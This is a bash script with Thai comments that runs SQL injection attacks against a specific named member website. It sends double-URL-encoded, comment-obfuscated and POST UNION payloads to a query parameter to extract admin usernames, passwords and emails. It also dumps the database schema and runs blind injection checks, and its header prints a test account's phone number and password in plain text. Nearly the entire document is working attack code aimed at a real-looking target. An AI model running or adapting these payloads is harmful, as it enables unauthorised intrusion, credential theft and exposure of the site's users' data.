#!/bin/bash

echo "🎯 EXTRACT ADMIN DATA FROM SUCCESSFUL WAF BYPASS"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
INJECTION_URL="$BASE_URL/public/js/v2/app.js"

echo "🔑 Test User: 0630471054 / laline1812"
echo ""

# 1. Double URL Encoding (สำเร็จ)
echo "🔓 เทคนิค 1: Double URL Encoding (สำเร็จ)..."

DOUBLE_ENCODED_ADMIN_PAYLOADS=(
    "25.1%2527%2520UNION%2520SELECT%2520username,password,email%2520FROM%2520users%2520WHERE%2520role%253D%2527admin%2527--"
    "25.1%2527%2520UNION%2520SELECT%2520id,username,password%2520FROM%2520users%2520WHERE%2520username%2520LIKE%2520%2527admin%2525%2527--"
    "25.1%2527%2520UNION%2520SELECT%2520email,password,role%2520FROM%2520users%2520WHERE%2520email%2520LIKE%2520%2527%2525admin%2525%2527--"
    "25.1%2527%2520UNION%2520SELECT%2520username,password,email%2520FROM%2520admins--"
    "25.1%2527%2520UNION%2520SELECT%2520id,username,password%2520FROM%2520admin_users--"
)

for i in "${!DOUBLE_ENCODED_ADMIN_PAYLOADS[@]}"; do
    payload="${DOUBLE_ENCODED_ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Double Encoded Admin Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "$response" | grep -i "admin\|password\|@" | head -5
        fi
    else
        echo "    ❌ Error"
    fi
    sleep 3
done

echo ""

# 2. Comment Bypass (สำเร็จ)
echo "🔓 เทคนิค 2: Comment Bypass (สำเร็จ)..."

COMMENT_ADMIN_PAYLOADS=(
    "25.1'/**/UNION/**/SELECT/**/username,password,email/**/FROM/**/users/**/WHERE/**/role='admin'--"
    "25.1'/*!UNION*//*!SELECT*//*!username,password,email*//*!FROM*//*!users*//*!WHERE*//*!role='admin'*/--"
    "25.1'/**/UNION/**/SELECT/**/id,username,password/**/FROM/**/users/**/WHERE/**/username/**/LIKE/**/'admin%'--"
    "25.1'/**/UNION/**/SELECT/**/email,password,role/**/FROM/**/users/**/WHERE/**/email/**/LIKE/**/'%admin%'--"
    "25.1'/**/UNION/**/SELECT/**/username,password,email/**/FROM/**/admins--"
)

for i in "${!COMMENT_ADMIN_PAYLOADS[@]}"; do
    payload="${COMMENT_ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Comment Admin Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "$response" | grep -i "admin\|password\|@" | head -5
        fi
    else
        echo "    ❌ Error"
    fi
    sleep 3
done

echo ""

# 3. HTTP Method Bypass (สำเร็จ)
echo "🔓 เทคนิค 3: HTTP Method Bypass (สำเร็จ)..."

POST_ADMIN_PAYLOADS=(
    "25.1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "25.1' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "25.1' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "25.1' UNION SELECT username,password,email FROM admins--"
    "25.1' UNION SELECT id,username,password FROM admin_users--"
)

for i in "${!POST_ADMIN_PAYLOADS[@]}"; do
    payload="${POST_ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ POST Admin Payload $((i+1))..."
    
    response=$(curl -s -X POST "$INJECTION_URL" \
        -d "v=$payload" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "$response" | grep -i "admin\|password\|@" | head -5
        fi
    else
        echo "    ❌ Error"
    fi
    sleep 3
done

echo ""

# 4. Database Schema Extraction
echo "🗄️ ดึงข้อมูล Database Schema..."

SCHEMA_PAYLOADS=(
    "25.1%2527%2520UNION%2520SELECT%2520table_name,null,null%2520FROM%2520information_schema.tables%2520WHERE%2520table_schema%253Ddatabase()--"
    "25.1'/**/UNION/**/SELECT/**/column_name,null,null/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'--"
    "25.1'/**/UNION/**/SELECT/**/column_name,null,null/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='admins'--"
    "25.1'/**/UNION/**/SELECT/**/table_name,column_name,null/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=database()--"
)

for i in "${!SCHEMA_PAYLOADS[@]}"; do
    payload="${SCHEMA_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Schema Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        if [[ "$response" == *"users"* ]] || [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    🔍 Schema ที่พบ:"
            echo "$response" | grep -i "users\|admin\|password\|email" | head -5
        fi
    else
        echo "    ❌ Error"
    fi
    sleep 3
done

echo ""

# 5. Blind SQL Injection for Admin Data
echo "🕵️ Blind SQL Injection for Admin Data..."

BLIND_PAYLOADS=(
    "25.1%2527%2520AND%2520(SELECT%2520COUNT(*)%2520FROM%2520users%2520WHERE%2520role%253D%2527admin%2527)%2520%253E%25200--"
    "25.1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/admins)/**/>/**/0--"
    "25.1%2527%2520AND%2520(SELECT%2520COUNT(*)%2520FROM%2520users%2520WHERE%2520username%2520LIKE%2520%2527admin%2525%2527)%2520%253E%25200--"
)

for i in "${!BLIND_PAYLOADS[@]}"; do
    payload="${BLIND_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Blind Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        if [[ ${#response} -gt 100 ]]; then
            echo "    🔍 อาจมีข้อมูล admin"
        fi
    else
        echo "    ❌ Error"
    fi
    sleep 3
done

echo ""
echo "=================================================="
echo "📊 สรุปผลการดึงข้อมูล Admin:"
echo "  🔓 Double URL Encoding: ✅ ดำเนินการแล้ว"
echo "  🔓 Comment Bypass: ✅ ดำเนินการแล้ว"
echo "  🔓 HTTP Method Bypass: ✅ ดำเนินการแล้ว"
echo "  🗄️ Database Schema: ✅ ดำเนินการแล้ว"
echo "  🕵️ Blind SQL Injection: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ response"
echo "📄 บันทึกผลลัพธ์ใน: admin_extraction_results.txt"